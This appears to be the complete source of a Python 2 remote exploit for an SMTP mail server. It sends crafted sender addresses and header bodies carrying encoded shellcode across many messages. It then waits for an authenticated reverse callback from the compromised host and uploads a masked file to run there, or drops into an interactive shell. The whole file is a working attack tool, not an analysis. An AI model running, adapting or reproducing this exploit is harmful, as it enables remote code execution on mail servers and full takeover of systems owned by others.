#!/usr/bin/env python
import os
import random
import re
import select
import socket
import string
import sys

import opts
import smtpUtils
import targets
import utils

import callback
import finder
import interactive
import upload

badBytes = [0x0, 0xa, 0xd, 0x22, 0x24, 0x28, 0x29, 0x2b, 0x2f] \
           + range(0x80, 0xa0)

def main():
   config = {'atimeout':
                {'longOpt': 'atimeout',
                 'arg': 'seconds',
                 'type': int,
                 'default': 30,
                 'desc': "Authentication timeout (in seconds)"},
             'cip':
                {'longOpt': 'cip',
                 'arg': 'IPAddress',
                 'type': str,
                 'default': '127.0.0.1',
                 'desc': "Callback IP address"},
             'clport':
                {'longOpt': 'clport',
                 'arg': 'port',
                 'type': int,
                 'desc': "Local callback port"},
             'cport':
                {'longOpt': 'cport',
                 'arg': 'port',
                 'type': int,
                 'desc': "Callback port"},
             'ctimeout':
                {'longOpt': 'ctimeout',
                 'arg': 'seconds',
                 'type': int,
                 'default': 30,
                 'desc': "Callback timeout (in seconds)"},
             'domain':
                {'longOpt': 'domain',
                 'arg': 'domainName',
                 'type': str,
                 'desc': "Domain name of sender"},
             'exec':
                {'longOpt': 'exec',
                 'arg': 'filename',
                 'type': str,
                 'desc': "File to exec on successful upload"},
             'recipient':
                {'longOpt': 'recipient',
                 'arg': 'emailAddress',
                 'type': str,
                 'default': 'root',
                 'desc': "Email recipient"},
             'target':
                {'longOpt': 'target',
                 'arg': 'target',
                 'type': str,
                 'desc': "Target OS"},
             'tip':
                {'longOpt': 'tip',
                 'arg': 'IPAddress',
                 'type': str,
                 'default': '127.0.0.1',
                 'desc': "Target IP address"},
             'tmpnam':
                {'longOpt': 'tmpnam',
                 'arg': 'filename',
                 'type': str,
                 'desc': "Remote name of the uploaded file "
                         "(of the form /tmp/fileXXXXXX)"},
             'tport':
                {'longOpt': 'tport',
                 'arg': 'port',
                 'type': int,
                 'default': 25,
                 'desc': "Target port"},
             'upload':
                {'longOpt': 'upload',
                 'arg': 'filename',
                 'type': str,
                 'desc': "File to upload"}
            }

   parms = opts.opts(sys.argv[0], config, targets.list)
   args = parms.parseCommandLine(sys.argv[1:])

   status = doExploit(parms)
   if (-1 == status):
      return 1      
   return status

def authenticateCallback(s, authCode, atimeout):
   r = ''
   while (1):
      readable, writable, exceptional = select.select([s], [], [], atimeout)
      if s in readable:
         reply = s.recv(4 - len(r))
         if ((None == reply) or ("" == reply)):
            break
         else:
            r += reply
            if (authCode[0:len(r)] == r):
               if (4 == len(r)):
                  print "   ... and it authenticated properly."
                  return 0
            else:
               break
      else:
         print "   ... but it did not authenticate in time."
         return -1
   print "   ... but it did not authenticate properly."
   return -1
   
def bindCallbackListener(cport, clport):
   ld = socket.socket()
   ld.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
   if (None == cport):
      if (None != clport):
         print "clport specified without cport -- ignoring."
      ld.bind(("", 0))	# neither specified, pick random
      ip, realCport = ld.getsockname()
   else:
      if (None != clport):
         ld.bind(("", clport))
      else:
         ld.bind(("", cport))
   ld.listen(64)
   if (None == cport):
      return ld, realCport
   return ld

def doExploit(parms):
   target = targets.factory(parms.get('target', None), badBytes)
   if (None == target):
      print "No target OS specified."
      return -1

   cport = parms.get('cport', None)
   clport = parms.get('clport', None);
   if (None == cport):
      ld, cport = bindCallbackListener(cport, clport)
   else:
      ld = bindCallbackListener(cport, clport)

   cip = parms.get('cip')
   callback.cip = socket.inet_aton(cip)
   callback.cport = utils.u16ToBeU16String(cport)

   authCode = utils.randomBase64(4,6)
   callback.authCode = authCode

   ufile = parms.get('upload', None)
   if (None != ufile):
      tmpnam = parms.get('tmpnam', None)
      if (None == tmpnam):
         tmpnam = utils.tmpnam()
      efile = parms.get('exec', None)
      if ((None != efile)
          and not (os.access(efile, os.F_OK or os.X_OK))):
         print "%s either does not exist or is not executable" % efile
         ld.close()
         return -1
      fd = open(ufile, 'r')
      ufileContents = fd.read()
      fd.close()
      mask = chr(random.randint(0,255))
      upload.data = mask	# okay, so I mean upload.mask, but oh well
      upload.tmpnam = tmpnam + "\0"
      unencoded = callback.build() + upload.build()
   else:
      unencoded = callback.build() + interactive.build()
   encoded = dulEncode(unencoded)

   domain = parms.get("domain", None)
   if (None == domain):   
      domain = utils.buildBuffer(0xe, badBytes)

   senderBegin = '\"' + utils.buildBuffer(3, badBytes)
   senderEnd = "\"@" + domain


   recipient = parms.get('recipient')

   finderValue = utils.buildBuffer(4, badBytes)
   sender2 = target.buildSender2(finderValue)
   if (None == sender2):
      print "Error building exploit message."
      ld.close()
      return -1

   body = finderValue +  encoded

   tip = parms.get('tip')
   tport = parms.get('tport')
   sd, banner = smtpUtils.connect(tip, tport, True)
   print banner.strip()
   if (None == re.compile(target.banner).search(banner)):
      print "The target's banner does not match expected banner."
      response = ' '
      while (("y" != response[0]) and ("n" != response[0])):
         response = string.lower(raw_input("Continue [y/N]? "));
         if ('' == response):
            response = "n"
      if ("n" == response[0]):
         sys.exit()

   smtpUtils.helo(sd, domain, validResponse)
   sent = 0
   maxLen = 0xff - len(senderBegin) - len(senderEnd)
   chop = maxLen % 4
   maxLen -= chop
   atimeout = parms.get('atimeout', None)
   if ("None" == atimeout):
      atimeout = None
   print "Sending a maximum of %d messages..." % (maxLen // 4)
   for fillLen in range(maxLen, 0, -4):
      # poll to see if we've received a callback
      status, ad = waitForCallback(ld, authCode, 0, atimeout)
      if (1 != status):
         smtpUtils.quit(sd)
         print "Sent %d messages." % sent
         break
      # send a new message
      sender1 = senderBegin
      senderBody = target.buildSender1(fillLen)
      if (None == senderBody):
         ld.close()
         return -1
      sender1 += senderBody
      sender1 += senderEnd

      try:
         smtpUtils.mailFrom(sd, sender1, validResponse)
         smtpUtils.rcptTo(sd, recipient, validResponse)
      except smtpUtils.smtpError, err:
         err.printMsg()
         print "\nSent %d messages." % sent
         ld.close()
         return -1
      smtpUtils.data(sd)
      smtpUtils.sendMsg(sd, "From: " + sender2, "Keywords: " + body)
      buf = smtpUtils.recvReply(sd).strip()
      print "%s:\t%s" % (hex(fillLen), buf)
      sent += 1
   else:
      smtpUtils.quit(sd)
      print "Sent %d messages." % sent
      print "Waiting for a callback..."
      ctimeout = parms.get('ctimeout', None)
      if ("None" == ctimeout):
         ctimeout = None
      status, ad = waitForCallback(ld, authCode, ctimeout, atimeout)

   ld.close() 
   if (0 != status):
      return -1

   readConnectionInfo(ad)

   if (None != ufile):
      print "Uploading %s to %s" % (ufile, tmpnam)
      status = uploadFile(ad, ufileContents, mask);
      if (1 == status):
         print "Upload successful"
         if (None != efile):
            print "Exec'ing %s" % efile
            fd = "%d" % ad.fileno()
            args = (efile, "-i", fd)
            os.execv(efile, args)
            print "Local exec failed"
         else:
            reply = ad.recv(1024)
            if ("" == reply):
               print "Remote exec succeeded"
               return 0
            elif (-1 == utils.leS32StringToS32(reply)):
               print "Remote exec failed"
            else:
               print "Received the following from afar:"
               utils.dumpHex(reply)
         return -1
      elif (-1 == status):
         print "status = %d" % status
   utils.interact(ad) 
   return 0

def dulEncode(unencodedShellcode):
   pathToDUL = "./DUL"
   unencodedFile = "tmp.unencoded"
   encodedFile = "tmp.encoded"

   f=open(unencodedFile, 'w');
   f.write(unencodedShellcode);
   f.close()
   os.system("%s %s %s > /dev/null" % (pathToDUL, unencodedFile, encodedFile))
   f=open(encodedFile,'r');
   #should only be one line
   encodedShellcode = f.readline()
   f.close()
   os.remove(unencodedFile)
   os.remove(encodedFile)
   return(encodedShellcode)

def readConnectionInfo(s):
   r = recv4(s)
   pid = utils.leS32StringToS32(r)
   r = recv4(s)
   euid = utils.leS32StringToS32(r)
   print "Talking to process %d (UID %d)" % (pid, euid)

def recv4(s):
   r = ''
   while (4 != len(r)):
      reply = smtpUtils.recvReply(s, 4 - len(r))
      r += reply
   return r

def uploadFile(s, contents, mask):
   table = ''
   for i in range(0, 256):
      table += chr(i ^ ord(mask))
   maskedContents = contents.translate(table)
   l = len(maskedContents)
   s.send(utils.u32ToLeU32String(l))
   if (0 != l):
      s.send(maskedContents)
      r = recv4(s)
      status = utils.leS32StringToS32(r)
      return status
   return 0
   
def validResponse(input, response):
   if ("250" == response[0:3]):
      return True
   return False

def waitForCallback(ld, authCode, ctimeout, atimeout):
   while (1):
      readable, writable, exceptional = select.select([ld], [], [], ctimeout)
      if ((0 == ctimeout) and (ld not in readable)):
         return 1, None
      elif ((0 == len(readable))
          and (0 == len(writable))
          and (0 == len(exceptional))):
         print "ERROR: Timeout waiting for callback"
         return 1, None
      elif ld not in readable:
         print "ERROR: Didn't get callback"
         ld.close()
         return 1, None

      sd, addr = ld.accept()
      print "Got a callback..."
      status = authenticateCallback(sd, authCode, atimeout)
      if (0 == status):
         return 0, sd
      sd.close()

if __name__ == "__main__":
   main()
